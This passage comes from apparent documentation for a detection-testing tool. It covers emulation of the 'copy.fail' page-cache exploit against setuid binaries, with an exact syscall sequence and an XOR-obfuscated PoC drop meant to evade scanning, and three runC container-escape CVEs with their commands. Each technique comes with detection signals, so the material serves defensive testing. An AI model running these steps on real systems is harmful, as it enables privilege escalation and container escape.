     followed by 32 null bytes (16-byte HMAC auth key || 16-byte AES enc key)
   - setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4)
   - accept() to obtain the transform fd
   - sendmsg(tfm_fd, MSG_MORE) with iov=[0x41 x 4 || chunk[0..4]] and control messages:
       ALG_SET_OP = ALG_OP_DECRYPT
       ALG_SET_IV = 16-byte null IV
       ALG_SET_AEAD_AUTHSIZE = 4
     Note: sendmsg is called BEFORE the splice pair — the exact ordering the real exploit uses
   - pipe2(O_CLOEXEC)
   - splice(file_fd, offset_src=chunk_offset, pipe_w, len=chunk_offset+4)
   - splice(pipe_r, tfm_fd, len=chunk_offset+4)
   - recv(tfm_fd, buf, 8 + chunk_offset) -> EBADMSG/EINVAL expected
   - posix_fadvise(file_fd, 0, 0, POSIX_FADV_DONTNEED) to evict the page-cache entry
   - All file descriptors for this chunk closed

Phase 2 - PoC file artefact:

1. Decrypts the copy.fail/exp script bytes in memory (XOR with fixed key; stored encrypted
   in the binary to avoid binary-level scanning)
2. Writes the decrypted bytes to /tmp/signalbench_copyfail_<pid>.py
3. Waits 2 seconds to allow file-scanning to complete
4. Deletes the file
5. The file is never executed

Syscalls generated (one representative chunk iteration; 37 iterations run in total):
```
socket(AF_ALG, SOCK_SEQPACKET, 0)
bind(alg_fd, {salg_type="aead", salg_name="authencesn(hmac(sha256),cbc(aes))"})
setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, copy_fail_key, 40)
setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4)
accept(alg_fd, NULL, NULL) -> tfm_fd
open("/usr/bin/su", O_RDONLY) -> file_fd
fstat(file_fd, ...)
read(file_fd, buf, 4096)
sendmsg(tfm_fd, {iov=[0x41*4 || chunk], cmsg=[ALG_SET_OP, ALG_SET_IV, ALG_SET_AEAD_AUTHSIZE]}, MSG_MORE)
pipe2([pipe_r, pipe_w], O_CLOEXEC)
splice(file_fd, &offset=chunk_offset, pipe_w, NULL, chunk_offset+4, 0)
splice(pipe_r, NULL, tfm_fd, NULL, chunk_offset+4, 0)
recv(tfm_fd, buf, 8+chunk_offset, 0)  -> EBADMSG/EINVAL
posix_fadvise(file_fd, 0, 0, POSIX_FADV_DONTNEED)
openat(AT_FDCWD, "/tmp/signalbench_copyfail_<pid>.py", O_WRONLY|O_CREAT)  [Phase 2]
unlinkat(AT_FDCWD, "/tmp/signalbench_copyfail_<pid>.py")                    [Phase 2]
```

Parameters:
- `target_file`: Target setuid binary for page-cache write (default: /usr/bin/su)

Detection opportunities:
- Phase 1 syscall signals:
  - socket(AF_ALG, SOCK_SEQPACKET) syscall repeated ~37 times in a tight loop — rare outside
    kernel crypto test suites
  - bind() with authencesn AEAD algorithm name string
  - setsockopt(SOL_ALG, ALG_SET_KEY) with a 40-byte netlink-attribute-encoded key
  - sendmsg() with MSG_MORE and ALG_SET_IV/ALG_SET_OP control messages called BEFORE splice()
  - splice() from a setuid binary into an AF_ALG transform fd
  - posix_fadvise(POSIX_FADV_DONTNEED) on a setuid binary immediately after splice activity,
    repeated per iteration — high-confidence page-cache eviction pattern
  - Combination of AF_ALG socket + splice-from-setuid-binary is a strong exploitation indicator
- Phase 2 file signals:
  - Creation of /tmp/signalbench_copyfail_<pid>.py — file reputation or content-hash match
    against the copy.fail/exp PoC script
  - File is written and deleted without being executed; write event alone is the detection signal

---

## CONTAINER ESCAPE - RunC CVE Exploits

### T1611.012 - RunC Masked Path Escape (CVE-2025-31133)

Description:
Executes the CVE-2025-31133 runC masked path escape pattern. Attempts to bypass container isolation by creating symlinks to masked paths and attempting bind mount operations.

How it works:
1. Detects container environment and runtime
2. Creates symlinks from /dev/null to target paths:
   - /proc/sys/kernel/core_pattern
   - /proc/sysrq-trigger
   - /proc/sys/kernel/modprobe
3. Attempts bind mount operations to expose masked paths
4. Probes masked path accessibility via read/stat operations
5. Attempts writes to exposed paths (if accessible)
6. Complete cleanup removes symlinks and unmounts

Commands executed:
```bash
ln -sf /proc/sys/kernel/core_pattern /tmp/masked_link
mount --bind /host/path /container/path
cat /proc/sys/kernel/core_pattern
```

Parameters:
- `output_dir`: Directory for logs and artefacts
- `target_paths`: Comma-separated list of paths to target

Detection opportunities:
- Symlink creation targeting /proc paths
- Mount syscalls from containers
- Access attempts to masked container paths
- /proc/sys/kernel/* access patterns
- Container escape telemetry signatures

### T1611.013 - RunC Console Escape (CVE-2025-52565)

Description:
Executes the CVE-2025-52565 runC console escape pattern. Manipulates /dev/pts entries and attempts to bind mount console devices to escape container isolation.

How it works:
1. Enumerates /dev/pts/* entries
2. Creates symlinks from /dev/pts entries to targets:
   - /dev/console
   - /dev/tty
   - /dev/ptmx
3. Attempts /dev/console bind mount operations
4. Probes console access patterns (read/write tests)
5. Attempts mknod operations for device creation
6. Attempts pty manipulation via ptmx access
7. Complete cleanup removes symlinks and unmounts

Commands executed:
```bash
ls -la /dev/pts/
ln -sf /dev/console /tmp/console_link
mount --bind /dev/pts/0 /dev/console
mknod /tmp/test_console c 5 1
```

Parameters:
- `output_dir`: Directory for logs and artefacts
- `console_targets`: Comma-separated list of console targets

Detection opportunities:
- /dev/pts enumeration
- Symlinks to console devices
- Console bind mount attempts
- mknod syscalls for character devices
- PTY manipulation patterns

### T1611.014 - RunC Procfs Escape (CVE-2025-52881)

Description:
Executes the CVE-2025-52881 runC procfs escape pattern. Manipulates mount propagation and attempts to access writable /proc entries to escape container restrictions.

How it works:
1. Attempts shared mount manipulation (mount --make-shared /proc)
2. Creates symlinks targeting /proc/sys/kernel/* paths
3. Probes procfs write accessibility for kernel parameters:
   - /proc/sys/kernel/hostname
   - /proc/sys/kernel/core_pattern
   - /proc/sys/kernel/panic
   - /proc/sys/kernel/randomize_va_space
4. Attempts writes to writable /proc entries
5. Enumerates sysctl entries via /proc/sys traversal
6. Complete cleanup restores original values and reverts mount changes

Commands executed:
```bash
mount --make-shared /proc
ls -la /proc/sys/kernel/
cat /proc/sys/kernel/hostname
echo "test" > /proc/sys/kernel/hostname
sysctl -a
```

Parameters:
- `output_dir`: Directory for logs and artefacts
- `proc_targets`: Comma-separated list of /proc paths to target

Detection opportunities:
- Mount propagation changes (make-shared, make-slave)
- /proc/sys/kernel write attempts
- sysctl enumeration from containers
- Kernel parameter modification attempts
- Container escape via procfs signatures
